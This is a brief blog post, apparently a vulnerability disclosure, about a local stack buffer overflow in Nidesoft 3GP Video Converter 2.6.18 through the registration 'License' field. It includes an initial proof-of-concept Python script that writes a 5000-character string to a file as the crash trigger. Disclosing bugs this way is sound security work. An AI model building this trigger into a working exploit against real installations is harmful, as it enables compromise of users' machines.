---
layout: post
title: Nidesoft 3GP Video Converter 2.6.18 - Local Stack Buffer Overflow
date: 2020-04-21 23:22:00
categories: posts
comments: false
en: true
---

 Nidesoft 3GP Video Converter 2.6.18 suffers from a Vanilla Stack Buffer Overflow when a long string is parsed through the parameter "License" within the Registration.
 
 Initial PoC:
 
 ```term
 import struct

buffer = "A" * 5000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
 ```
